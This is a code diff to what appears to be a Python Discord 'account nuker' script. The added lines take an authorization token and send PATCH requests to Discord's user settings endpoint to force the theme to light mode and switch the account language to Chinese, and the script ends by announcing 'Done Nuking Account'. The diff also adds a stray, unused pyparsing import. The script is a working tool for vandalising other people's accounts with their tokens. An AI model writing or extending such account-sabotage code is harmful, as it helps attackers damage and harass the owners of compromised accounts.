@@ -31,6 +31,8 @@ if error == True:
 colorama.init(autoreset=True)
 
 import json
+
+from pyparsing import col
 try:
   json_data = open("settings.json")
   json_data = json.load(json_data)
@@ -183,6 +185,31 @@ async def on_ready():
                 break
             if "429" in r5:
                 print(colorama.Fore.YELLOW + "[-] Rate Limited")
+
+
+    ior = "https://discord.com/api/v9/users/@me/settings"
+    jso2 = {"theme": "light"}
+
+
+    rog = requests.patch(ior, headers=head, json=jso2)
+    rog = str(rog)
+    if "200" in rog:
+        print(colorama.Fore.GREEN + "[+] Set Light Mode As Theme")
+    if "200" not in rog:
+        print(colorama.Fore.RED + "[+] Failed To Set Light Mode")
+
+    jso3 = {
+        "locale": "zh-TW"
+    }
+
+    rog2 = requests.patch(ior, headers=head, json=jso3)
+    print(rog2)
+    rog2 = str(rog2)
+    if "200" in rog2:
+        print(colorama.Fore.GREEN + "[+] Set Chinese As Language")
+    if "200" not in rog2:
+        print(colorama.Fore.RED + "[-] Failed To Set Language As Chinese")
+
 
 
     print(colorama.Fore.GREEN + "[+] Done Nuking Account, You May Close This Program Now")
